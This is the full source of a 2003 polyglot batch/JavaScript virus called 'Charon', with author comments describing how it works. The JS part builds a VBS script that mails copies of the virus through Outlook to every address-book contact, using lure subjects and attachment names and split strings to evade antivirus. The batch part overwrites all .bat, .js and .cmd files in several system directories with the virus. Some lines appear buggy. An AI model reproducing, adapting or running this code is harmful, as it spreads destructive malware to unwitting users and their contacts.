/*
:: BAT|JS.Charon
:: by Second Part To Hell[rRlf]
:: www.spth.de.vu
:: spth@aonmail.at
:: Austria
:: written on 15.02.2003
::
:: Special things:
:: The virus is able to spread via expansion BAT and JS!
:: If it runs via JS it works in this way:
:: --> It makes a VBS file which send eMails with the virus
:: --> Than it opens the vbs file (now the virus is spreat via eMail)
:: --> It copies itself to a BAT file
:: --> This BAT file infect all JS, BAT and CMD files
:: If it runs via BAT it works in this way:
:: --> It infect all JS, BAT and CMD files
:: --> copy itself to a JS file
:: --> run he JS file
:: Something else interessting:
:: It uses different subjects, bodys and attachment-names
:: Also sometimes the attachment-name is "BAT" and sometimes "JS". ;)
:: I used a VBS file to spread for avoing AV-detection (because I crypt some parts of the vbs-file)

:: Thanks goes to:
:: T-2000[IR]     <-- I-Worm.Dawn  <-> for the random-thing
:: AlcoPaul[b0]   <-- BatXP.RarMee <-> for some ideas ;)
:: Kefi[rRlf]     <-- FSO-Tutorial <-> for more ideas :D
*/

/*
goto bat
*/
var fso=WScript.CreateObject("Scripting.FileSystemObject")
var shell=WScript.CreateObject("Wscript.Shell")
var MySf=fso.OpenTextFile(WScript.ScriptFullName,1)
var MySC=MySf.ReadAll()
MySf.Close()
var cra="Next"
var crb="Send"
var crc="Attachments"
var crd="Add"
var cre="Address"
var charon=fso.CreateTextFile("charon.js")
charon.WriteLine (MySC);
charon.Close();


var sur=Math.round(Math.random()*5)+1
if (sur==1) 
{ var subject="Hi";
}
if (sur==2) 
{ var subject="Hello!";
}
if (sur==3) 
{ var subject=";-)";
}
if (sur==4)
{ var subject="(none)";
}
if (sur==5)
{ var subject="FWD:"
}

var bor=Math.round(Math.random()*5)+1
if (bor==1) 
{ var body="A nice pic waits for opening";
}
if (bor==2) 
{ var body="";
}
if (bor==3) 
{ var body="Hi! what's up with u? open this little photo of charon!!";
}
if (bor==4)
{ var body="Do you know Charon? Here is it!";
}
if (bor==5)
{ var body="Charon loves u! ;)"
}

var atr=Math.round(Math.random()*5)
if (atr==1) 
{ var attachmenta="lovely_mouse";
}
if (atr==2) 
{ var attachmenta="charon_meets_u";
}
if (atr==3) 
{ var attachmenta="Sexy_girl_on_charon";
}
if (atr==4)
{ var attachmenta="charon";
}
if (atr==5)
{ var attachmenta="hot_lickin"
}

var attr=Math.round(Math.random()*2)
if (attr==1)
{ var expan=".bat";
}
if (attr==2)
{ var expan=".js";
}

var attachment="C:\\"+attachmenta+expan
var email=fso.CreateTextFile("email.vbs")
email.WriteLine ("On Error Resume Next")
email.WriteLine ("Set fso=CreateObject("+unescape("%22")+"Scripting.FileSystemObject"+unescape("%22")+")")
email.WriteLine ("Set out=Wscript.CreateObject("+unescape("%22")+"Outlook.Application"+unescape("%22")+")")
email.WriteLine ("Set mapi=out.GetNameSpace("+unescape("%22")+"MAPI"+unescape("%22")+")")
email.WriteLine ("Set a = mapi."+cre+"Lists(1)")
email.WriteLine ("For x=1 To a."+cre+"Entries.Count")
email.WriteLine ("Set Mail=ol.CreateItem(0)")
email.WriteLine ("Mail.to=ol.GetNameSpace("+unescape("%22")+"MAPI"+unescape("%22")+")."+cre+"Lists(1)."+cre+"Entries(x)")
email.WriteLine ("Mail.Subject="+unescape("%22")+subject+unescape("%22"))
email.WriteLine ("Mail.Body="+unescape("%22")+body+unescape("%22"))
email.WriteLine ("Mail."+crc+"."+crd+"("+unescape("%22")+attachment+unescape("%22")+")")
email.WriteLine ("Mail."+crb)
email.WriteLine (cra)
email.WriteLine ("ol.Quit")
email.Close()
shell.run ("email.vbs");
if (fso.FileExists("C:\\charon.bat"))
{
}
else
{
  fso.CopyFile("charon.js","C:\\charon.bat");
  shell.run ("C:\\charon.bat");
}
/*
:bat
copy %0 C:\charon.bat
echo off
set a=goto
set a=for
goto pluto
set a=set
:pluto
%a% %%a in (*.bat ..\*.bat %windir%\*.bat %path%\*.bat) do copy %0 %%a
%a% %%b in (*.js ..\*.js %windir%\*.js %path%\*.js) do copy %0 %%b
%a% %%c in (*.cmd ..\*.cmd %windir%\*.cmd %path%\*.cmd) do copy %0 %%c
if exist C:\charon.js goto charon
copy %0 C:\charon.js
cscript C:\charon.js
:charon
exit
*/

